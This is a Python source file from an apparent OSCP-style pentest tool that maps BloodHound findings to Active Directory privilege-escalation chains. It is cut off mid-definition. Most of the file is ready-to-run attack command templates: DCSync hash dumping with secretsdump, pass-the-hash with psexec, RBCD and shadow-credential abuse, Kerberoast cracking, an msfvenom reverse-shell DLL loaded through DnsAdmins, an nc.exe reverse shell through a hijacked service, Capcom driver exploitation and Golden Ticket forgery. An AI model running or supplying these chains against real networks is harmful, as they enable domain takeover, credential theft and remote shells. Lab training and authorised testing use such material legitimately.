"""
Attack Chain Detection and Dynamic Recommendation Generation.

This module detects multi-step privilege escalation paths from BloodHound
data and generates step-by-step recommendations with context.

Attack chains are detected by analyzing combinations of findings that
together form a viable escalation path. For example:

Forest HTB Chain:
    Account Operators membership + Exchange WriteDACL on Domain
    → Create user → Add to Exchange Windows Permissions → Grant DCSync → Dump hashes

Each chain defines:
    - Required findings (prerequisites)
    - Steps with dynamic command generation
    - Context explaining WHY each step works
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import List, Dict, Optional, Any, Callable
import uuid

from .models import (
    Finding,
    FindingType,
    Recommendation,
    RecommendationPriority,
    AttackState,
)


class ChainStatus(Enum):
    """Status of an attack chain."""
    NOT_VIABLE = auto()     # Missing prerequisites
    READY = auto()          # All prerequisites met, can start
    IN_PROGRESS = auto()    # Currently executing
    COMPLETED = auto()      # All steps done
    BLOCKED = auto()        # Step failed, cannot continue


@dataclass
class ChainStep:
    """A single step in an attack chain."""
    id: str
    name: str
    description: str
    why: str                           # Explanation of WHY this works
    command_template: str              # Command with {placeholders}
    required_vars: List[str]           # Variables needed for command
    platform: str = "kali"             # "kali" or "target"
    on_success_note: Optional[str] = None
    on_failure_note: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class AttackChain:
    """
    A multi-step privilege escalation path.

    Chains are detected from BloodHound findings and generate
    context-aware recommendations for each step.
    """
    id: str
    name: str
    description: str
    oscp_relevance: str               # Why this matters for OSCP
    required_finding_tags: List[str]  # All these tags must be present
    steps: List[ChainStep]
    priority: RecommendationPriority = RecommendationPriority.CRITICAL
    metadata: Dict[str, Any] = field(default_factory=dict)


# ============================================================================
# KNOWN ATTACK CHAINS
# ============================================================================

EXCHANGE_DCSYNC_CHAIN = AttackChain(
    id="exchange_dcsync",
    name="Exchange WriteDACL → DCSync",
    description=(
        "Exploit Exchange Windows Permissions WriteDACL on domain to grant "
        "DCSync rights and dump all domain hashes."
    ),
    oscp_relevance=(
        "Common in environments with Exchange Server installed. "
        "The Exchange Windows Permissions group has excessive rights by default."
    ),
    required_finding_tags=["ACCOUNT_OPERATORS", "EXCHANGE_WINDOWS_PERMISSIONS", "WRITEDACL"],
    priority=RecommendationPriority.CRITICAL,
    steps=[
        ChainStep(
            id="create_user",
            name="Create Domain User",
            description="Create a new domain user via Account Operators privilege",
            why=(
                "Account Operators can create users and add them to non-protected groups. "
                "We need a clean user to grant DCSync rights without modifying the current session."
            ),
            command_template="net user {new_user} '{new_pass}' /add /domain",
            required_vars=["new_user", "new_pass"],
            platform="target",
            on_success_note="User created. Next: add to Exchange Windows Permissions.",
            on_failure_note="Account Operators privilege may not be effective. Check group membership.",
        ),
        ChainStep(
            id="add_to_exchange",
            name="Add User to Exchange Windows Permissions",
            description="Add new user to Exchange Windows Permissions group",
            why=(
                "Exchange Windows Permissions has WriteDACL on the domain object. "
                "Adding our user gives us the ability to modify domain-level ACLs."
            ),
            command_template='net group "Exchange Windows Permissions" {new_user} /add',
            required_vars=["new_user"],
            platform="target",
            on_success_note="User is now in Exchange Windows Permissions. Next: grant DCSync rights.",
        ),
        ChainStep(
            id="add_winrm_access",
            name="Add to Remote Management Users (optional)",
            description="Add user to Remote Management Users for WinRM access",
            why=(
                "This step is optional but allows testing with a fresh session. "
                "The new user will have WinRM access if this succeeds."
            ),
            command_template='net localgroup "Remote Management Users" {new_user} /add',
            required_vars=["new_user"],
            platform="target",
        ),
        ChainStep(
            id="grant_dcsync",
            name="Grant DCSync Rights via PowerView",
            description="Use PowerView Add-ObjectACL to grant replication rights",
            why=(
                "WriteDACL allows modifying the domain's Discretionary Access Control List. "
                "We add DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights, "
                "which are required for DCSync (domain replication protocol abuse)."
            ),
            command_template=""". .\\PowerView.ps1
$pass = ConvertTo-SecureString '{new_pass}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{domain}\\{new_user}', $pass)
Add-ObjectACL -PrincipalIdentity {new_user} -Credential $cred -Rights DCSync""",
            required_vars=["new_user", "new_pass", "domain"],
            platform="target",
            on_success_note="DCSync rights granted. Run secretsdump from Kali.",
            on_failure_note="PowerView may have been blocked. Try manual ACL modification.",
            metadata={"requires_upload": "PowerView.ps1"},
        ),
        ChainStep(
            id="dcsync_dump",
            name="DCSync - Extract Domain Hashes",
            description="Use secretsdump to extract all domain user hashes",
            why=(
                "DCSync mimics a Domain Controller requesting replication data. "
                "With DCSync rights, we can extract password hashes for all users "
                "including the Administrator, without needing NTDS.dit access."
            ),
            command_template="impacket-secretsdump {domain}/{new_user}:'{new_pass}'@{target}",
            required_vars=["domain", "new_user", "new_pass", "target"],
            platform="kali",
            on_success_note="Look for Administrator NTLM hash for pass-the-hash.",
        ),
        ChainStep(
            id="pass_the_hash",
            name="Pass-the-Hash to SYSTEM",
            description="Use Administrator NTLM hash for SYSTEM shell",
            why=(
                "With the Administrator NTLM hash, we can authenticate without "
                "knowing the password. psexec creates a service on the target "
                "and returns a SYSTEM shell."
            ),
            command_template="impacket-psexec {domain}/Administrator@{target} -hashes {admin_hash}",
            required_vars=["domain", "target", "admin_hash"],
            platform="kali",
            on_success_note="SYSTEM shell achieved. Get root.txt flag.",
        ),
    ],
)


GENERICALL_PASSWORD_RESET_CHAIN = AttackChain(
    id="genericall_password_reset",
    name="GenericAll → Password Reset → Lateral Movement",
    description=(
        "Use GenericAll rights on a user to reset their password and "
        "gain access to their resources."
    ),
    oscp_relevance=(
        "GenericAll is full control. If you have this on a user, "
        "you can reset their password without knowing the current one."
    ),
    required_finding_tags=["GENERICALL", "HIGH_VALUE"],
    priority=RecommendationPriority.HIGH,
    steps=[
        ChainStep(
            id="reset_password",
            name="Reset Target User Password",
            description="Reset password using GenericAll privilege",
            why=(
                "GenericAll includes the right to reset passwords. "
                "The target won't be notified and their current password is irrelevant."
            ),
            command_template="net user {target_user} '{new_pass}' /domain",
            required_vars=["target_user", "new_pass"],
            platform="target",
            on_success_note="Password reset. Test credentials via crackmapexec.",
            on_failure_note="May require PowerView Set-DomainUserPassword instead.",
        ),
        ChainStep(
            id="test_creds",
            name="Verify Credentials",
            description="Test the new credentials work",
            why="Always verify credential changes before proceeding.",
            command_template="crackmapexec smb {target} -u '{target_user}' -p '{new_pass}' -d {domain}",
            required_vars=["target", "target_user", "new_pass", "domain"],
            platform="kali",
        ),
    ],
)


FORCECHANGEPASSWORD_CHAIN = AttackChain(
    id="force_change_password",
    name="ForceChangePassword → Credential Access",
    description="Reset a user's password using ForceChangePassword right.",
    oscp_relevance=(
        "ForceChangePassword is more limited than GenericAll but "
        "still allows password resets on the target user."
    ),
    required_finding_tags=["FORCECHANGEPASSWORD"],
    priority=RecommendationPriority.HIGH,
    steps=[
        ChainStep(
            id="change_password",
            name="Force Password Change",
            description="Reset password using ForceChangePassword privilege",
            why=(
                "ForceChangePassword right allows changing another user's password "
                "without knowing their current password."
            ),
            command_template=""". .\\PowerView.ps1
$NewPassword = ConvertTo-SecureString '{new_pass}' -AsPlainText -Force
Set-DomainUserPassword -Identity {target_user} -AccountPassword $NewPassword""",
            required_vars=["target_user", "new_pass"],
            platform="target",
            on_success_note="Password changed. Test with crackmapexec.",
            metadata={"requires_upload": "PowerView.ps1"},
        ),
    ],
)


BACKUP_OPERATORS_CHAIN = AttackChain(
    id="backup_operators",
    name="Backup Operators → NTDS.dit Extraction",
    description=(
        "Use Backup Operators privilege to backup NTDS.dit and SYSTEM hive, "
        "then extract hashes offline."
    ),
    oscp_relevance=(
        "Backup Operators can backup any file including NTDS.dit. "
        "This is a well-known privilege escalation path."
    ),
    required_finding_tags=["BACKUP_OPERATORS"],
    priority=RecommendationPriority.CRITICAL,
    steps=[
        ChainStep(
            id="backup_sam",
            name="Backup SAM and SYSTEM Hives",
            description="Use reg.exe to save SAM and SYSTEM registry hives",
            why=(
                "Backup Operators can read protected files. "
                "SAM contains local user hashes, SYSTEM contains the boot key for decryption."
            ),
            command_template="""reg save HKLM\\SAM C:\\Temp\\sam.save
reg save HKLM\\SYSTEM C:\\Temp\\system.save""",
            required_vars=[],
            platform="target",
            on_success_note="Registry hives saved. Transfer to Kali for extraction.",
        ),
        ChainStep(
            id="extract_hashes",
            name="Extract Hashes with secretsdump",
            description="Use secretsdump to extract hashes from saved hives",
            why="secretsdump can parse registry hives offline to extract password hashes.",
            command_template="impacket-secretsdump -sam sam.save -system system.save LOCAL",
            required_vars=[],
            platform="kali",
            on_success_note="Local Administrator hash extracted. Use for pass-the-hash.",
        ),
    ],
)


RBCD_CHAIN = AttackChain(
    id="rbcd",
    name="RBCD → Impersonation → SYSTEM",
    description=(
        "Abuse WriteAccountRestrictions or GenericAll on a computer to configure "
        "Resource-Based Constrained Delegation and impersonate Administrator via S4U2Proxy."
    ),
    oscp_relevance=(
        "Most accessible delegation attack. Common in OSCP+ labs and real engagements. "
        "Does not require SYSTEM on the target — only write access to its msDS-AllowedToActOnBehalfOfOtherIdentity attribute."
    ),
    required_finding_tags=["WRITE_ACCOUNT_RESTRICTIONS", "RBCD"],
    priority=RecommendationPriority.CRITICAL,
    steps=[
        ChainStep(
            id="add_fake_computer",
            name="Add Controlled Computer Account",
            description="Create a machine account we control via MachineAccountQuota",
            why=(
                "RBCD requires a principal with an SPN. By default, any domain user can add "
                "up to 10 machine accounts (MachineAccountQuota). We create BTFAKE$ and control "
                "its credentials, so we can request S4U tickets as it."
            ),
            command_template=(
                "impacket-addcomputer {domain}/{username}:'{password}' "
                "-computer-name 'BTFAKE$' -computer-pass 'FakePass123!' -dc-ip {target}"
            ),
            required_vars=["domain", "username", "password", "target"],
            platform="kali",
            on_success_note="BTFAKE$ created. Next: configure RBCD on target computer.",
            on_failure_note="MachineAccountQuota may be 0. Try using an existing computer account you control.",
        ),
        ChainStep(
            id="set_rbcd",
            name="Write RBCD Attribute on Target Computer",
            description="Set msDS-AllowedToActOnBehalfOfOtherIdentity to allow BTFAKE$ to delegate",
            why=(
                "WriteAccountRestrictions (or GenericAll) allows modifying msDS-AllowedToActOnBehalfOfOtherIdentity. "
                "Setting this to include BTFAKE$ tells the KDC that the target computer trusts BTFAKE$ "
                "to present impersonated tickets via S4U2Proxy."
            ),
            command_template=(
                "impacket-rbcd {domain}/{username}:'{password}' "
                "-delegate-to '{target_computer}$' -delegate-from 'BTFAKE$' "
                "-dc-ip {target} -action write"
            ),
            required_vars=["domain", "username", "password", "target_computer", "target"],
            platform="kali",
            on_success_note="RBCD configured. Next: request impersonated service ticket.",
        ),
        ChainStep(
            id="get_impersonated_ticket",
            name="Request Impersonated Ticket via S4U2Self+S4U2Proxy",
            description="Obtain a CIFS ticket impersonating Administrator",
            why=(
                "S4U2Self lets BTFAKE$ obtain a service ticket to itself on behalf of any user. "
                "S4U2Proxy then converts that into a ticket for cifs/{target_computer} — "
                "all without knowing Administrator's password."
            ),
            command_template=(
                "impacket-getST {domain}/'BTFAKE$':'FakePass123!' "
                "-spn cifs/{target_computer}.{domain} -impersonate Administrator -dc-ip {target}"
            ),
            required_vars=["domain", "target_computer", "target"],
            platform="kali",
            on_success_note="Ticket saved as Administrator@cifs_{target_computer}.{domain}.ccache",
            on_failure_note="Ensure target_computer FQDN is correct and DNS resolves.",
        ),
        ChainStep(
            id="use_ticket",
            name="PSExec with Kerberos Ticket",
            description="Use the impersonated ticket for a SYSTEM shell",
            why=(
                "The ccache ticket authenticates us as Administrator without a password. "
                "KRB5CCNAME tells impacket which ticket cache to use. psexec creates a "
                "remote service and returns a SYSTEM shell."
            ),
            command_template=(
                "KRB5CCNAME=Administrator@cifs_{target_computer}.{domain}.ccache "
                "impacket-psexec -k -no-pass {domain}/Administrator@{target_computer}"
            ),
            required_vars=["domain", "target_computer"],
            platform="kali",
            on_success_note="SYSTEM shell achieved via RBCD impersonation.",
        ),
    ],
)


UNCONSTRAINED_DELEGATION_COERCION_CHAIN = AttackChain(
    id="unconstrained_delegation_coercion",
    name="Unconstrained Delegation + Coercion → DC TGT → DCSync",
    description=(
        "Coerce a Domain Controller to authenticate to a machine with unconstrained delegation, "
        "capture the DC's TGT, then use it to DCSync all domain hashes."
    ),
    oscp_relevance=(
        "High-impact. Frequently seen in labs and real environments with legacy servers. "
        "Unconstrained delegation stores any incoming TGT in LSASS — coercion forces the DC to send one."
    ),
    required_finding_tags=["UNCONSTRAINED_DELEGATION", "COERCION"],
    priority=RecommendationPriority.CRITICAL,
    steps=[
        ChainStep(
            id="start_rubeus_monitor",
            name="Start Rubeus TGT Monitor on Delegation Host",
            description="Monitor LSASS for incoming TGTs from the Domain Controller",
            why=(
                "Machines with unconstrained delegation store TGTs of authenticating principals in LSASS. "
                "Rubeus monitor polls for new tickets every N seconds so we capture the DC$ TGT "
                "the moment coercion forces authentication."
            ),
            command_template=(
                "Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC$ /filteruser:DC$"
            ),
            required_vars=[],
            platform="target",
            on_success_note="Monitor running. In a separate session, trigger coercion.",
        ),
        ChainStep(
            id="coerce_dc",
            name="Coerce DC Authentication via PetitPotam",
            description="Force the DC to authenticate to our unconstrained delegation host",
            why=(
                "PetitPotam abuses MS-EFSR (or MS-FSRVP) to coerce NTLM/Kerberos authentication. "
                "When the DC connects to {unconstrained_host}, its TGT is deposited in LSASS there "
                "because unconstrained delegation is configured."
            ),
            command_template=(
                "python3 PetitPotam.py {unconstrained_host} {dc_ip} "
                "-u {username} -p '{password}'"
            ),
            required_vars=["unconstrained_host", "dc_ip", "username", "password"],
            platform="kali",
            on_success_note="Coercion sent. Check Rubeus output for DC$ TGT base64 blob.",
        ),
        ChainStep(
            id="convert_ticket",
            name="Convert Captured TGT to ccache",
            description="Convert Rubeus base64 kirbi output to ccache format for impacket",
            why=(
                "Rubeus outputs tickets in base64-encoded kirbi format (Windows native). "
                "impacket tools consume ccache format. ticketConverter bridges the two."
            ),
            command_template=(
                "python3 ticketConverter.py base64_ticket.kirbi dc_ticket.ccache"
            ),
            required_vars=[],
            platform="kali",
            on_success_note="dc_ticket.ccache ready. Use it for DCSync.",
            on_failure_note="Save the Rubeus base64 blob to a file first: echo 'BASE64...' | base64 -d > base64_ticket.kirbi",
        ),
        ChainStep(
            id="dcsync_with_dc_tgt",
            name="DCSync Using Captured DC TGT",
            description="Use the DC's own TGT to perform DCSync and dump all hashes",
            why=(
                "The DC$ TGT authenticates us as the Domain Controller itself. "
                "DCs have inherent replication rights, so secretsdump can pull "
                "all domain hashes without needing an explicit DCSync ACE."
            ),
            command_template=(
                "KRB5CCNAME=dc_ticket.ccache "
                "impacket-secretsdump -k -no-pass {domain}/DC\\$@{dc_hostname}"
            ),
            required_vars=["domain", "dc_hostname"],
            platform="kali",
            on_success_note="All domain hashes dumped. Extract krbtgt for golden ticket or Administrator for PTH.",
        ),
    ],
)


SHADOW_CREDENTIALS_CHAIN = AttackChain(
    id="shadow_credentials",
    name="Shadow Credentials → PKINIT → NT Hash",
    description=(
        "Abuse AddKeyCredentialLink rights to add a shadow credential (key pair) to a target account, "
        "authenticate via PKINIT, and extract the NT hash without knowing the current password."
    ),
    oscp_relevance=(
        "Clean, stealthy attack. No password change required — the account keeps working normally. "
        "Increasingly common in modern AD environments assessed in OSCP+ and real engagements."
    ),
    required_finding_tags=["ADD_KEY_CREDENTIAL_LINK", "SHADOW_CREDENTIALS"],
    priority=RecommendationPriority.CRITICAL,
    steps=[
        ChainStep(
            id="add_shadow_credential",
            name="Add Shadow Credential to Target Account",
            description="Write a controlled key pair into msDS-KeyCredentialLink on the target",
            why=(
                "msDS-KeyCredentialLink stores public key credentials for PKINIT pre-authentication. "
                "AddKeyCredentialLink rights let us append our own key pair. The target's existing "
                "credentials are untouched — only an additional auth path is added."
            ),
            command_template=(
                "certipy shadow auto -u {username}@{domain} -p '{password}' "
                "-account {target_user} -dc-ip {target}"
            ),
            required_vars=["username", "domain", "password", "target_user", "target"],
            platform="kali",
            on_success_note="Shadow credential added. {target_user}.pfx saved locally.",
            on_failure_note=(
                "If certipy fails, try pywhisker: "
                "python3 pywhisker.py -d {domain} -u {username} -p '{password}' "
                "--target {target_user} --action add --dc-ip {target}"
            ),
        ),
        ChainStep(
            id="pkinit_auth",
            name="Authenticate via PKINIT and Extract NT Hash",
            description="Use the generated certificate to authenticate and recover the NT hash",
            why=(
                "certipy auth performs PKINIT using our certificate. The KDC responds with a TGT "
                "and the NT hash of the account (via PKINIT PA-PK-AS-REP unpacking). "
                "We get the hash without touching LSASS or the account password."
            ),
            command_template="certipy auth -pfx {target_user}.pfx -dc-ip {target}",
            required_vars=["target_user", "target"],
            platform="kali",
            on_success_note="NT hash extracted from PKINIT response. Use for pass-the-hash.",
        ),
        ChainStep(
            id="pass_the_hash_shadow",
            name="Pass-the-Hash with Recovered NT Hash",
            description="Authenticate as the target user using their NT hash",
            why=(
                "NT hashes authenticate via NTLMv2 without needing the plaintext password. "
                "evil-winrm provides an interactive shell if WinRM is available on the target."
            ),
            command_template=(
                "evil-winrm -i {target} -u {target_user} -H {nt_hash}"
            ),
            required_vars=["target", "target_user", "nt_hash"],
            platform="kali",
            on_success_note="Shell as {target_user}. Check privileges for further escalation.",
        ),
    ],
)


TARGETED_KERBEROAST_CHAIN = AttackChain(
    id="targeted_kerberoast",
    name="GenericWrite → Set SPN → Targeted Kerberoast",
    description=(
        "Abuse GenericWrite or WriteSPN on a user to set a fake SPN, "
        "request a Kerberos service ticket, and crack it offline."
    ),
    oscp_relevance=(
        "Standard Kerberoasting only works against existing service accounts. "
        "Targeted Kerberoast extends this to any user you have GenericWrite on, "
        "including high-value targets like Domain Admins."
    ),
    required_finding_tags=["GENERICWRITE", "TARGETED_KERBEROAST"],
    priority=RecommendationPriority.HIGH,
    steps=[
        ChainStep(
            id="set_spn_and_roast",
            name="Set SPN and Request Hash (targetedKerberoast.py)",
            description="Automatically set SPN, request TGS, then clean up",
            why=(
                "GenericWrite allows modifying user attributes including servicePrincipalName. "
                "Once an SPN exists on the account, the KDC will issue a TGS encrypted with "
                "the user's NT hash — which we crack offline. The script cleans up the SPN after."
            ),
            command_template=(
                "python3 targetedKerberoast.py -d {domain} -u {username} -p '{password}' "
                "--request-user {target_user} -dc-ip {target}"
            ),
            required_vars=["domain", "username", "password", "target_user", "target"],
            platform="kali",
            on_success_note="TGS hash written to output. Proceed to crack.",
            on_failure_note=(
                "Manual alternative: "
                "Set-DomainObject -Identity {target_user} -Set @{{serviceprincipalname='nonexistent/YOURSERVICE'}} "
                "then run impacket-GetUserSPNs"
            ),
        ),
        ChainStep(
            id="request_tgs_manual",
            name="Request TGS via GetUserSPNs (manual path)",
            description="Request service ticket for target user after manually setting SPN",
            why=(
                "impacket-GetUserSPNs queries the KDC for TGS tickets for accounts with SPNs. "
                "The -request-user flag limits the query to the specific target. "
                "Output is in hashcat-compatible format."
            ),
            command_template=(
                "impacket-GetUserSPNs {domain}/{username}:'{password}' "
                "-dc-ip {target} -request-user {target_user} -outputfile targeted_kerberoast.txt"
            ),
            required_vars=["domain", "username", "password", "target", "target_user"],
            platform="kali",
            on_success_note="Hash saved to targeted_kerberoast.txt. Crack with hashcat.",
        ),
        ChainStep(
            id="crack_tgs",
            name="Crack TGS Hash Offline",
            description="Use hashcat mode 13100 to crack the Kerberos TGS hash",
            why=(
                "TGS hashes use RC4-HMAC (mode 13100) or AES256 (mode 19700). "
                "RC4 is much faster to crack. If the account has a weak password, "
                "rockyou typically recovers it in minutes."
            ),
            command_template=(
                "hashcat -m 13100 targeted_kerberoast.txt /usr/share/wordlists/rockyou.txt --force"
            ),
            required_vars=[],
            platform="kali",
            on_success_note="Password cracked. Authenticate directly as {target_user}.",
            on_failure_note="Try rule-based: append --rules-file /usr/share/hashcat/rules/best64.rule",
        ),
    ],
)


DNSADMINS_CHAIN = AttackChain(
    id="dnsadmins",
    name="DnsAdmins → Malicious DLL → SYSTEM on DC",
    description=(
        "Abuse DnsAdmins group membership to configure the DNS service to load an arbitrary DLL, "
        "then restart DNS to execute code as SYSTEM on the Domain Controller."
    ),
    oscp_relevance=(
        "Classic group-based privilege escalation. DNS runs as SYSTEM on DCs. "
        "High-impact — one DLL load gives you SYSTEM on the Domain Controller."
    ),
    required_finding_tags=["DNSADMINS"],
    priority=RecommendationPriority.CRITICAL,
    steps=[
        ChainStep(
            id="create_malicious_dll",
            name="Create Reverse Shell DLL",
            description="Generate a DLL payload that calls back to our listener",
            why=(
                "The DNS service loads the plugin DLL as SYSTEM. Any code in the DLL runs "
                "with SYSTEM privileges. msfvenom generates a standard staged reverse shell DLL "
                "in the correct PE format for Windows."
            ),
            command_template=(
                "msfvenom -p windows/x64/shell_reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f dll -o dns_plugin.dll"
            ),
            required_vars=["lhost", "lport"],
            platform="kali",
            on_success_note="dns_plugin.dll created. Host it via SMB before configuring DNS.",
        ),
        ChainStep(
            id="host_smb_share",
            name="Host DLL on SMB Share",
            description="Serve the DLL over an unauthenticated SMB share",
            why=(
                "dnscmd loads the plugin via UNC path (\\\\host\\share\\dll). "
                "impacket-smbserver creates an anonymous SMB2 share that the DC can read "
                "without credentials."
            ),
            command_template=(
                "impacket-smbserver share /tmp/dns -smb2support"
            ),
            required_vars=[],
            platform="kali",
            on_success_note="SMB share running. Copy dns_plugin.dll to /tmp/dns/ first.",
        ),
        ChainStep(
            id="configure_dns_plugin",
            name="Configure DNS to Load Malicious Plugin",
            description="Use dnscmd to set the ServerLevelPluginDll registry value",
            why=(
                "DnsAdmins can call dnscmd /config to set ServerLevelPluginDll. "
                "This registry value specifies a DLL the DNS service loads at startup. "
                "The DC reads it from our SMB share when DNS restarts."
            ),
            command_template=(
                "dnscmd {dc_hostname} /config /serverlevelplugindll \\\\\\\\{lhost}\\\\share\\\\dns_plugin.dll"
            ),
            required_vars=["dc_hostname", "lhost"],
            platform="target",
            on_success_note="Plugin path set. Start your listener, then restart DNS.",
        ),
        ChainStep(
            id="restart_dns",
            name="Restart DNS Service to Trigger DLL Load",
            description="Stop and start the DNS service to execute the payload",
            why=(
                "DNS loads ServerLevelPluginDll at service startup. Stopping and starting "
                "the service forces the load. DnsAdmins can control services on DCs via sc."
            ),
            command_template=(
                "sc \\\\\\\\{dc_hostname} stop dns && sc \\\\\\\\{dc_hostname} start dns"
            ),
            required_vars=["dc_hostname"],
            platform="target",
            on_success_note="DNS restarted. Catch shell on listener. Cleanup: dnscmd {dc_hostname} /config /serverlevelplugindll 0",
            on_failure_note="If sc fails, try: net stop dns && net start dns (requires elevated session on DC).",
        ),
    ],
)


SERVER_OPERATORS_CHAIN = AttackChain(
    id="server_operators",
    name="Server Operators → Service Hijack → SYSTEM",
    description=(
        "Abuse Server Operators group membership to modify a service binary path, "
        "replacing it with a reverse shell that runs as SYSTEM."
    ),
    oscp_relevance=(
        "Well-known group privilege escalation path. Server Operators can configure and start "
        "services on Domain Controllers — services run as SYSTEM."
    ),
    required_finding_tags=["SERVER_OPERATORS"],
    priority=RecommendationPriority.HIGH,
    steps=[
        ChainStep(
            id="upload_nc",
            name="Upload Reverse Shell Binary to Target",
            description="Transfer nc.exe or a reverse shell binary to a writable path",
            why=(
                "We need a binary on disk that the service will execute. "
                "nc.exe is simplest. Upload via SMB, WinRM, or existing foothold."
            ),
            command_template=(
                "smbclient \\\\\\\\{target}\\\\C$ -U '{domain}\\\\{username}%{password}' "
                "-c 'put /usr/share/windows-resources/binaries/nc.exe Temp\\\\nc.exe'"
            ),
            required_vars=["target", "domain", "username", "password"],
            platform="kali",
            on_success_note="nc.exe uploaded to C:\\Temp\\nc.exe on target.",
        ),
        ChainStep(
            id="hijack_service",
            name="Modify Service Binary Path",
            description="Redirect a stopped service's binary path to our reverse shell",
            why=(
                "Server Operators have SeServiceLogonRight and can modify service configuration. "
                "Changing binpath replaces what code runs when the service starts. "
                "VSS (Volume Shadow Copy) is a reliable target — it's stopped by default."
            ),
            command_template=(
                "sc config VSS binpath=\"C:\\\\Temp\\\\nc.exe -e cmd.exe {lhost} {lport}\""
            ),
            required_vars=["lhost", "lport"],
            platform="target",
            on_success_note="Service reconfigured. Start your listener then start the service.",
        ),
        ChainStep(
            id="start_listener",
            name="Start Netcat Listener",
            description="Listen for the incoming SYSTEM shell",
            why="nc.exe will connect back when the service starts. The listener must be ready first.",
            command_template="nc -nlvp {lport}",
            required_vars=["lport"],
            platform="kali",
        ),
        ChainStep(
            id="start_service",
            name="Start the Hijacked Service",
            description="Trigger service execution to receive SYSTEM shell",
            why=(
                "Starting the service executes our binary path as SYSTEM. "
                "Server Operators have the right to start and stop services."
            ),
            command_template="sc start VSS",
            required_vars=[],
            platform="target",
            on_success_note="Shell received as SYSTEM. Restore service: sc config VSS binpath=<original_path>",
        ),
    ],
)


PRINT_OPERATORS_CHAIN = AttackChain(
    id="print_operators",
    name="Print Operators → SeLoadDriverPrivilege → Kernel Code Execution",
    description=(
        "Abuse Print Operators group membership to load a malicious kernel driver "
        "via SeLoadDriverPrivilege, achieving code execution at the kernel level."
    ),
    oscp_relevance=(
        "More involved than DnsAdmins or Server Operators but achieves kernel-level execution. "
        "SeLoadDriverPrivilege is exclusively held by Print Operators among standard groups."
    ),
    required_finding_tags=["PRINT_OPERATORS"],
    priority=RecommendationPriority.HIGH,
    steps=[
        ChainStep(
            id="enable_load_driver_privilege",
            name="Enable SeLoadDriverPrivilege in Current Token",
            description="Activate the load driver privilege using token manipulation",
            why=(
                "Group membership grants SeLoadDriverPrivilege but it must be explicitly enabled "
                "in the access token before use. This requires a tool that calls AdjustTokenPrivileges."
            ),
            command_template=(
                "# Use EnableSeLoadDriverPrivilege.exe or PowerShell:\n"
                "# Upload and run: .\\EnablePrivilege.exe SeLoadDriverPrivilege"
            ),
            required_vars=[],
            platform="target",
            on_success_note="Privilege enabled. Proceed to load malicious driver.",
            metadata={"requires_upload": "EnablePrivilege.exe"},
        ),
        ChainStep(
            id="load_driver",
            name="Load Vulnerable/Malicious Driver",
            description="Use NtLoadDriver to load a kernel driver that provides privilege escalation",
            why=(
                "NtLoadDriver loads a kernel driver given a registry path. "
                "Capcom.sys (CVE-2016-6199) allows arbitrary ring-0 execution from user-mode. "
                "Alternatively, a custom driver can directly modify SYSTEM process token to elevate."
            ),
            command_template=(
                "# Upload Capcom.sys and loader:\n"
                ".\\CapcomLoader.exe"
            ),
            required_vars=[],
            platform="target",
            on_success_note="Driver loaded. Execute kernel payload to obtain SYSTEM token.",
            on_failure_note="Driver signing enforcement may block unsigned drivers. Requires test signing or HVCI disabled.",
            metadata={"requires_upload": "Capcom.sys, CapcomLoader.exe"},
        ),
        ChainStep(
            id="execute_as_system",
            name="Execute Privileged Shell via Kernel Callback",
            description="Use the loaded driver to spawn a SYSTEM process",
            why=(
                "Once a vulnerable driver is loaded, we can invoke its IOCTL interface to execute "
                "arbitrary code in ring-0 and steal the SYSTEM process token, yielding a SYSTEM shell."
            ),
            command_template=(
                ".\\ExploitCapcom.exe"
            ),
            required_vars=[],
            platform="target",
            on_success_note="SYSTEM shell spawned via kernel token theft.",
        ),
    ],
)


CROSS_TRUST_SID_HISTORY_CHAIN = AttackChain(
    id="cross_trust_sid_history",
    name="Cross-Domain Trust → SID History Forgery → Enterprise Admin",
    description=(
        "Compromise a child or trusted domain, forge a Golden Ticket with the target domain's "
        "Enterprise Admins SID in the SID history field, and gain full access across the trust."
    ),
    oscp_relevance=(
        "Advanced multi-domain attack. Demonstrates forest privilege escalation via trust abuse. "
        "Requires krbtgt hash of the source domain — typically follows DCSync or NTDS.dit extraction."
    ),
    required_finding_tags=["DOMAIN_TRUST", "SID_HISTORY"],
    priority=RecommendationPriority.CRITICAL,
    steps=[
        ChainStep(
            id="get_krbtgt_hash",
            name="Extract krbtgt Hash from Compromised Domain",
            description="DCSync to obtain the krbtgt NT hash needed for Golden Ticket forgery",
            why=(
                "The Golden Ticket is signed with the krbtgt key. Possessing this hash "
                "lets us forge arbitrary TGTs for any user, with any group memberships, "
                "in the source domain."
            ),
            command_template=(
                "impacket-secretsdump {domain}/{admin}@{dc_ip} -just-dc-user krbtgt"
            ),
            required_vars=["domain", "admin", "dc_ip"],
            platform="kali",
            on_success_note="Note the krbtgt NT hash and domain SID for ticket forgery.",
        ),
        ChainStep(
            id="forge_golden_ticket",
            name="Forge Golden Ticket with Target Domain SID History",
            description="Create a TGT for Administrator with Enterprise Admins SID of the target domain injected",
            why=(
                "SID history allows a principal to carry SIDs from other domains in their token. "
                "By adding the target domain's Enterprise Admins SID (S-1-5-21-<target>-519) "
                "to the forged ticket's extra-sid field, the target DC grants us EA-level access "
                "when we present the ticket across the trust."
            ),
            command_template=(
                "impacket-ticketer -nthash {krbtgt_hash} "
                "-domain-sid {source_sid} -domain {domain} "
                "-extra-sid {target_ea_sid} Administrator"
            ),
            required_vars=["krbtgt_hash", "source_sid", "domain", "target_ea_sid"],
            platform="kali",
            on_success_note=(
                "Forged ticket saved as Administrator.ccache. "
                "target_ea_sid format: S-1-5-21-<target_domain_sid>-519"
            ),
            on_failure_note=(
                "Get target domain SID: impacket-getPac {target_domain}/{any_user}:{pass} -targetUser Administrator"
            ),
        ),
        ChainStep(
            id="use_forged_ticket",
            name="PSExec into Target Domain DC Using Forged Ticket",
            description="Present the forged ticket to the target DC for a SYSTEM shell",
            why=(
                "The forged TGT crosses the trust and the target domain KDC honors it "
                "because the trust key signs the ticket. The EA SID in history grants "
                "Domain Admin equivalence on the target."
            ),
            command_template=(
                "KRB5CCNAME=Administrator.ccache "
                "impacket-psexec -k -no-pass {target_domain}/Administrator@{target_dc}"
            ),
            required_vars=["target_domain", "target_dc"],
            platform="kali",
            on_success_note="SYSTEM shell on target domain DC. Full forest compromise achieved.",
            on_failure_note=(
